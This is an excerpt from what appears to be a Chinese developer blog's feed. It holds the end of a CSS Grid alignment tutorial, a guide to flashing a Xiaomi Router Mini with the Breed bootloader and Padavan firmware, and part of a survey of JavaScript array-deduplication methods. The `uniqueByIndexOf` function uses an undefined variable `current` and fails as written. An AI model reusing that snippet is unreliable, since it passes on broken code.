class="selector-pseudo">:nth-child</span>(<span class="number">2</span>) &#123;</span><br><span class="line">  <span class="attribute">grid-column</span>: <span class="number">2</span>/span <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240509000624.png" alt="image.png|350"></p><blockquote><p>如果是使用区域定位，那么区域定位元素前如果有空位，后面的元素会默认填充在前面的空位上。</p></blockquote><h1 id="11-栅格的整体对其方式的处理-justify-content-align-content"><a href="#11-栅格的整体对其方式的处理-justify-content-align-content" class="headerlink" title="11. 栅格的整体对其方式的处理 justify-content align-content"></a>11. 栅格的整体对其方式的处理 justify-content align-content</h1><p>与 Flex 布局一样的是，Grid 布局也同样可以是用 <code>justify-content</code> 进行整体栅格的对其。</p><p>示例 1：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">300px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">50px</span>;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#000000</span>;</span><br><span class="line">  <span class="attribute">display</span>: grid;</span><br><span class="line">  <span class="attribute">grid-template-rows</span>: <span class="built_in">repeat</span>(<span class="number">1</span>, <span class="number">50px</span>);</span><br><span class="line">  <span class="attribute">grid-template-columns</span>: <span class="built_in">repeat</span>(<span class="number">3</span>, <span class="number">50px</span>);</span><br><span class="line">  <span class="attribute">justify-content</span>: center;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240509001327.png" alt="image.png|350"></p><p>示例 2：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">300px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">50px</span>;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#000000</span>;</span><br><span class="line">  <span class="attribute">display</span>: grid;</span><br><span class="line">  <span class="attribute">grid-template-rows</span>: <span class="built_in">repeat</span>(<span class="number">1</span>, <span class="number">50px</span>);</span><br><span class="line">  <span class="attribute">grid-template-columns</span>: <span class="built_in">repeat</span>(<span class="number">3</span>, <span class="number">50px</span>);</span><br><span class="line">  <span class="attribute">justify-content</span>: space-evenly;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240509001359.png" alt="image.png|350"></p><p>此外，由于 Grid 布局是二维布局，还可以使用 <code>align-content</code> 来进行垂直方向上的居中对其（针对于 Flex 这种一维布局时没有垂直方向的，所以该属性在 Flex 布局中无效）。</p><h1 id="12-栅格内元素的整体控制-justify-items-align-items"><a href="#12-栅格内元素的整体控制-justify-items-align-items" class="headerlink" title="12. 栅格内元素的整体控制 justify-items align-items"></a>12. 栅格内元素的整体控制 justify-items align-items</h1><p><code>justify-items</code> 与 <code>align-items</code> 在 Grid 布局中同样生效。</p><blockquote><p>关于 <code>justify-items</code> 的效果说明：</p><ul><li>在块级布局中，会将其包含的项目在其行内轴上对齐；</li><li>绝对定位的元素中，会将其包含的项目在其行内轴上对齐，同时考虑 top、left、bottom、right 的值；</li><li>表格单元中，该属性被忽略（块级元素、绝对定位元素和表格布局中对齐的<a href="https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_Box_Alignment/Box_Alignment_In_Block_Abspos_Tables">更多信息</a>）；</li><li>弹性盒子布局中，该属性被忽略（弹性盒子中对齐的<a href="https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_Box_Alignment/Box_Alignment_in_Flexbox">更多信息</a>）；</li><li>栅格布局中，会将其栅格区域内的项目在其行内轴上对齐（栅格布局中对齐的<a href="https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_Box_Alignment/Box_Alignment_In_Grid_Layout">更多信息</a>）；</li></ul></blockquote><p>在默认情况下，<code>justify-items</code> 与 <code>align-items</code> 的默认值都是 <code>stretch</code>，布局内元素如果没有设置宽高将会被自动拉伸，填充至每个栅格：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">400px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#000000</span>;</span><br><span class="line">  <span class="attribute">display</span>: grid;</span><br><span class="line">  <span class="attribute">grid-template-rows</span>: <span class="built_in">repeat</span>(<span class="number">1</span>, <span class="number">100px</span>);</span><br><span class="line">  <span class="attribute">grid-template-columns</span>: <span class="built_in">repeat</span>(<span class="number">4</span>, <span class="number">1</span>fr);</span><br><span class="line">  <span class="attribute">align-items</span>: stretch;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.container</span>&gt;<span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: skyblue;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">5px</span> solid pink;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240509002138.png" alt="image.png|350"></p><p>示例 1：改变 <code>justify-items</code> 属性</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">  justify-items: left;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240509002202.png" alt="image.png|350"></p><p>示例 2：改变 <code>align-items</code> 属性</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">  <span class="attribute">align-items</span>: center;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240509002238.png" alt="image.png|350"></p><h1 id="12-栅格内单一元素对其方式的处理-align-self-justify-self"><a href="#12-栅格内单一元素对其方式的处理-align-self-justify-self" class="headerlink" title="12. 栅格内单一元素对其方式的处理 align-self justify-self"></a>12. 栅格内单一元素对其方式的处理 align-self justify-self</h1><p>除了上述对栅格内所有元素进进行统一的对其方式处理外，还可以利用 <code>justify-self</code> 与 <code>align-self</code> 进行对栅格内单一元素的对其方式的处理。如我们想要单独将第一个元素进行上下左右居中，就可以写为：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">400px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#000000</span>;</span><br><span class="line">  <span class="attribute">display</span>: grid;</span><br><span class="line">  <span class="attribute">grid-template-rows</span>: <span class="built_in">repeat</span>(<span class="number">1</span>, <span class="number">100px</span>);</span><br><span class="line">  <span class="attribute">grid-template-columns</span>: <span class="built_in">repeat</span>(<span class="number">4</span>, <span class="number">1</span>fr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.container</span>&gt;<span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: skyblue;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">5px</span> solid pink;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.container</span> <span class="selector-pseudo">:first</span>-child &#123;</span><br><span class="line">  <span class="attribute">align-self</span>: center;</span><br><span class="line">  justify-self: center;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240509002411.png" alt="image.png|350"></p><h1 id="14-组合简写栅格的对其方式"><a href="#14-组合简写栅格的对其方式" class="headerlink" title="14. 组合简写栅格的对其方式"></a>14. 组合简写栅格的对其方式</h1><p>我们简单整理一下上面三节的整体内容：</p><ul><li>对于栅格整体的对其方式，我们使用了 <code>justify-content</code> 与 <code>align-content</code>；</li><li>对于栅格内元素的对其方式，我们使用了 <code>justify-items</code> 与 <code>align-items</code>；</li><li>对于栅格内单一元素的对其方式，我们使用了 <code>justify-self</code> 与 <code>align-self</code>。</li></ul><p>那么对于 <code>justify-content</code> 与 <code>align-content</code> 其为一组，我们可以使用 <code>place-content</code> 来对其进行简写，如：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">  <span class="attribute">align-content</span>: center;</span><br><span class="line">  <span class="attribute">justify-content</span>: left;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>相当于：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">  place-<span class="attribute">content</span>: center left;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="http://img.cdn.esunr.xyz/markdown/20200228192304.png" alt=""></p><p>对于 <code>justify-items</code> 与 <code>align-items</code> 其为一组，我们可以使用 <code>place-items</code> 来对其进行简写，如：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">  <span class="attribute">align-items</span>: center;</span><br><span class="line">  justify-items: left;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>相当于：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">  place-items: center left;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="http://img.cdn.esunr.xyz/markdown/20200228192517.png" alt=""></p><p>对于 <code>justify-self</code> 与 <code>align-self</code> 其为一组，我们可以使用 <code>place-self</code> 来对其进行简写，如：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.container</span> <span class="selector-pseudo">:first</span>-child &#123;</span><br><span class="line">  <span class="attribute">align-self</span>: center;</span><br><span class="line">  justify-self: left;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>相当于：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.container</span> <span class="selector-pseudo">:first</span>-child &#123;</span><br><span class="line">  place-self: center left;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="http://img.cdn.esunr.xyz/markdown/20200228192838.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> CSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 快速使用 </tag>
            
            <tag> CSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小米路由器mini刷入Padavan教程</title>
      <link href="/2020/03/548b3a5af510.html"/>
      <url>/2020/03/548b3a5af510.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-刷入低版本的小米路由器固件并开启-ssh-功能"><a href="#1-刷入低版本的小米路由器固件并开启-ssh-功能" class="headerlink" title="1. 刷入低版本的小米路由器固件并开启 ssh 功能"></a>1. 刷入低版本的小米路由器固件并开启 ssh 功能</h1><p>按照 <a href="https://www.youtube.com/watch?v=U1QkNUpuYCg&amp;t=615s">https://www.youtube.com/watch?v=U1QkNUpuYCg&amp;t=615s</a> 视频教程，到成功 SSH 功能开启的那一步。</p><blockquote><p>按照视频中使用 MT 工具箱的方法已经不可用了，所以还是需要刷入 Padavan。</p></blockquote><p>其中老旧版本的固件可以转到 <a href="https://mirom.ezbox.idv.tw/miwifi/">https://mirom.ezbox.idv.tw/miwifi/</a> 进行下载，小米路由器 mini 可用的固件版本为 <code>miwifi_r1cm_firmware_5def5_2.17.100</code> 。</p><h1 id="2-刷入-bread"><a href="#2-刷入-bread" class="headerlink" title="2. 刷入 bread"></a>2. 刷入 bread</h1><blockquote><p>bread 相当于路由器的引导系统，类似于 Android 的 Recover、TWRP</p></blockquote><p>恩山无线论坛 breed 帖子：<a href="https://link.jianshu.com/?t=http://www.right.com.cn/forum/thread-161906-1-1.html">http://www.right.com.cn/forum/thread-161906-1-1.html</a>，在里面找到下载地址，然后下载小米 mini 专用<a href="https://link.jianshu.com/?t=http://breed.hackpascal.net/breed-mt7620-xiaomi-mini.bin">breed-mt7620-xiaomi-mini.bin</a>；接着把 breed-mt7620-xiaomi-mini.bin 用 WinSCP 传到 /tmp 目录，PuTTY 连上路由器并切换目录至 /tmp 准备刷入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">mtd -r write breed-mt7620-xiaomi-mini.bin Bootloader</span><br></pre></td></tr></table></figure><p>刷入后，机器会重新启动，指示灯变蓝，这时需要确保电脑设置为自动获取 IP 地址，并且是用网线连上的路由器。</p><p>最后打开 CMD，运行 ping 192.168.1.1 -t（这时是 ping 不通的），按如下流程：</p><p>1，断开小米路由器的电源，用牙签等尖锐物按下路由器 reset 按钮后重新接入电源；<br>2，等到 mini 路由器的灯开始闪烁或 ping 通时即表明进入 Web 刷机模式，松开 reset 键。</p><p>这时在电脑上输入 192.168.1.1，就进入不死 Breed 的控制台了。</p><h1 id="3-刷入-Padavan-固件"><a href="#3-刷入-Padavan-固件" class="headerlink" title="3. 刷入 Padavan 固件"></a>3. 刷入 Padavan 固件</h1><p>Padavan 固件可以在 <a href="http://opt.cn2qq.com/padavan/">http://opt.cn2qq.com/padavan/</a> 进行下载，小米路由器 mini 的固件为：</p><p><img src="http://img.cdn.esunr.xyz/markdown/20200313162829.png" alt=""></p><p>在 Breed Web 控制台依次选择：固件更新 -&gt; 常规固件 -&gt; 勾选固件复选框 -&gt; 浏览，选择下载好的 Padavan 固件上传，刷入搞定！</p><p>注意，此时在启动方式里面选择的是普通固件，如果想刷回小米原厂固件，进入“固件启动设置页面”，将固件类型选择为“小米 Mini”保存，然后就可以完美启动小米 Mini 原厂固件了，而且可以使用串口 (TTL) 登录。</p><p>刷机完成后浏览器输入 <code>http://192.168.123.1/</code> 进入 Padavan 系统管理界面</p><h1 id="4-网络设置"><a href="#4-网络设置" class="headerlink" title="4. 网络设置"></a>4. 网络设置</h1><p>我刷入 Padavan 的目的是为了做无线 AP ，同时又希望接入该 AP 的设备能够使用 SSR。</p><p>为了达到这个需求，首先不能使用 Padavan 中的纯 AP 模式（也就是使用 LAN 模式作为 AP-Client 角色），这样就无法使用 SSR 的功能，原因很简单，因为纯 AP 的模式下，AP 路由需要关闭 DHCP 服务，AP 的 IP 以及网关地址都是静态的，需要与我们的主路由（也就是当前网络中的网关设备）位于同一 IP 频段下。因此纯 AP 的模式仅仅是放大了主路由的信号，当新设备接入 AP 并进行网络传输时，AP 将数据包直接转发给主路由，并不会经过 Padavan 的 SSR 服务，因此 AP 下的 SSR 服务虽然能够正常运行，但实际上并没有效果。其网络结构如下：</p><p><img src="http://img.cdn.esunr.xyz/markdown/20200314233522.png" alt=""></p><p>因此我们要使用 WAN 模式作为 AP-Client 的角色，WAN 模式就相当于我们的 AP 连接上了主路由器之后，在加入 AP 的设备跟主路由位于不同的频段，这个频段是 AP 创建的一个新频段，如：我们主路由器的频段为 <code>192.168.31.x</code> 那么 AP 的新频段为 <code>192.168.123.x</code>。在这个模式下，AP 路由的 IP 地址是动态的，同时 AP 端也需要开启 DHCP 服务（为了给连接 AP 的设备分配 IP 地址），就可以正常使用 SSR 服务。其网络结构如下：</p><p><img src="http://img.cdn.esunr.xyz/markdown/20200314233322.png" alt=""></p><p>但是 WAN 模式的缺点是访问其管理页面时，<code>192.168.123.1</code> 这个访问地址只能在 AP 网络下进行访问，要是想要在主网络环境下无法访问其管理页面，同时 FTP 以及 SAMBA 服务也不能在主网络环境下进行访问。</p><p>进行如下设置即可使用 WAN 模式进行 AP 桥接：</p><p><img src="http://img.cdn.esunr.xyz/markdown/20200314234907.png" alt=""></p><blockquote><p>注意：在 WAN 模式下，内网设置要保持 DHCP 服务的开启</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>整理JavaScript数组去重的种种方法</title>
      <link href="/2020/03/c082ab29b93d.html"/>
      <url>/2020/03/c082ab29b93d.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h1><p>数组去重是个相对于简单的需求，但是其比较考验编程人员对 Javascript 对数组 API 以及数据类型的熟悉程度。</p><p>去重的目标数组：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj1 = &#123; <span class="attr">name</span>: <span class="string">&quot;花花&quot;</span> &#125;;</span><br><span class="line"><span class="keyword">let</span> obj2 = &#123; <span class="attr">name</span>: <span class="string">&quot;小明&quot;</span> &#125;;</span><br><span class="line"><span class="keyword">var</span> arr = [ <span class="number">1</span>, <span class="string">&quot;1&quot;</span>, <span class="number">1</span>, <span class="string">&quot;NaN&quot;</span>, <span class="literal">undefined</span>, obj2, <span class="literal">null</span>, <span class="literal">undefined</span>, <span class="title class_">NaN</span>, <span class="title class_">NaN</span>, <span class="number">1</span>, obj1, <span class="literal">null</span>, obj1, obj2 ];</span><br></pre></td></tr></table></figure><h1 id="2-使用-Javascript-中某些数据类型的值不会重复的特性进行去重"><a href="#2-使用-Javascript-中某些数据类型的值不会重复的特性进行去重" class="headerlink" title="2. 使用 Javascript 中某些数据类型的值不会重复的特性进行去重"></a>2. 使用 Javascript 中某些数据类型的值不会重复的特性进行去重</h1><h2 id="2-1-使用-Set-结构"><a href="#2-1-使用-Set-结构" class="headerlink" title="2.1 使用 Set 结构"></a>2.1 使用 Set 结构</h2><p>使用 Set 结构进行数组去重是 ES6 环境下最为推荐的方式，其特性就是不允许数组中出现重复的元素：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">uniqueBySet</span>(<span class="params">arr</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">Array</span>.<span class="title function_">from</span>(<span class="keyword">new</span> <span class="title class_">Set</span>(arr));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ 1, &#x27;1&#x27;, &#x27;NaN&#x27;, undefined, &#123; name: &#x27;小明&#x27; &#125;, null, NaN, &#123; name: &#x27;花花&#x27; &#125; ]</span><br></pre></td></tr></table></figure><p>甚至还可以更加精简：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[...<span class="keyword">new</span> <span class="title class_">Set</span>(arr)]</span><br></pre></td></tr></table></figure><h2 id="2-2-使用-Object-keys-特性"><a href="#2-2-使用-Object-keys-特性" class="headerlink" title="2.2 使用 Object keys 特性"></a>2.2 使用 Object keys 特性</h2><p>一个 Object 不允许有相同的键值，因此我们可以用其特性进行去重：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">uniqueByObject</span>(<span class="params">arr</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> result = [];</span><br><span class="line">  <span class="keyword">let</span> obj = &#123;&#125;;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> item <span class="keyword">of</span> arr) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!obj[item]) &#123;</span><br><span class="line">      result.<span class="title function_">push</span>(item);</span><br><span class="line">      obj[item] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>但是由于 Object Key 只能为字符串，所以无法分辨 Number 与 String 的区别，并且无法分别引用类型的数据（因为会被转为 “[object Object]” 类似的字符串）。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ 1, &#x27;NaN&#x27;, undefined, &#123; name: &#x27;小明&#x27; &#125;, null ]</span><br></pre></td></tr></table></figure><p>如果我们将其键值存储为 <code>typeof item + item</code> 那么，<code>&quot;1&quot;</code> 被存入为键值的时候就会成为 <code>&quot;string1&quot;</code>，<code>1</code> 被存为键值的时候就会成为 <code>&quot;number1&quot;</code>，这样就能区分 Number 与 String 了。同时我们还可以使用 <code>Object.prototype.hasOwnProperty()</code> 来判断创建的对象是否有某一属性，这样更为严谨：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">uniqueByHasOwnProperty</span>(<span class="params">arr</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line">  <span class="keyword">return</span> arr.<span class="title function_">filter</span>(<span class="keyword">function</span>(<span class="params">item</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> obj.<span class="title function_">hasOwnProperty</span>(<span class="keyword">typeof</span> item + item)</span><br><span class="line">      ? <span class="literal">false</span></span><br><span class="line">      : (obj[<span class="keyword">typeof</span> item + item] = <span class="number">1</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>但是此时我们仍无法区分引用类型</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ 1, &#x27;1&#x27;, &#x27;NaN&#x27;, undefined, &#123; name: &#x27;小明&#x27; &#125;, null, NaN ]</span><br></pre></td></tr></table></figure><h2 id="2-3-使用-Map-keys-特性"><a href="#2-3-使用-Map-keys-特性" class="headerlink" title="2.3 使用 Map keys 特性"></a>2.3 使用 Map keys 特性</h2><p>Map 结构优于 Object 结构的是其键值可以存放对象，这样就可以完美应用于数组去重：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">uniqueByMap</span>(<span class="params">arr</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> map = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> item <span class="keyword">of</span> arr) &#123;</span><br><span class="line">    map.<span class="title function_">set</span>(item, <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// map.keys() 返回的是一个新的 Map iterator 对象，需要转换为数组再返回</span></span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">Array</span>.<span class="title function_">from</span>(map.<span class="title function_">keys</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ 1, &#x27;1&#x27;, &#x27;NaN&#x27;, undefined, &#123; name: &#x27;小明&#x27; &#125;, null, NaN, &#123; name: &#x27;花花&#x27; &#125; ]</span><br></pre></td></tr></table></figure><h1 id="3-for-循环嵌套去重"><a href="#3-for-循环嵌套去重" class="headerlink" title="3. for 循环嵌套去重"></a>3. for 循环嵌套去重</h1><p>这是最简单明了的一种去重方式，也是 ES5 环境下可以使用的去重方式，其利用 <code>splice()</code> 方法，会直接修改目标数组：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">uniqueByFor</span>(<span class="params">arr</span>) &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; arr.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> j = i + <span class="number">1</span>; j &lt; arr.<span class="property">length</span>; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (arr[i] === arr[j]) &#123;</span><br><span class="line">        arr.<span class="title function_">splice</span>(j, <span class="number">1</span>);</span><br><span class="line">        j--;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>由于 NaN === NaN 结果为 false，所以其无法对 NaN 进行去重</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ 1, &#x27;1&#x27;, &#x27;NaN&#x27;, undefined, &#123; name: &#x27;小明&#x27; &#125;, null, NaN, NaN, &#123; name: &#x27;花花&#x27; &#125; ]</span><br></pre></td></tr></table></figure><h1 id="4-使用-indexOf-去重"><a href="#4-使用-indexOf-去重" class="headerlink" title="4. 使用 indexOf 去重"></a>4. 使用 indexOf 去重</h1><h2 id="3-1-单纯使用-indexOf"><a href="#3-1-单纯使用-indexOf" class="headerlink" title="3.1 单纯使用 indexOf"></a>3.1 单纯使用 indexOf</h2><p>使用 <code>Array.prototype.indexOf()</code> 方法可以检索元素的出现位置，更重要的是判断元素是否存在于某个数组中。</p><p>因此我们可以额外准备一个新数组，依次遍历目标数组，遍历时看当前遍历的元素是否在创建的新数组中，如果不存在就放入新数组，否则就不需要放入新数组，最终将这个新数组返回即可，且该方法可以用于 ES5 环境：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">uniqueByIndexOf</span>(<span class="params">arr</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> result = [];</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; arr.<span class="property">length</span>; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (result.<span class="title function_">indexOf</span>(current) === -<span class="number">1</span>) &#123;</span><br><span class="line">      result.<span class="title function_">push</span>(current);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>由于 [NaN].indexOf(NaN) 结果为 -1，所以无法对 NaN 进行去重</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 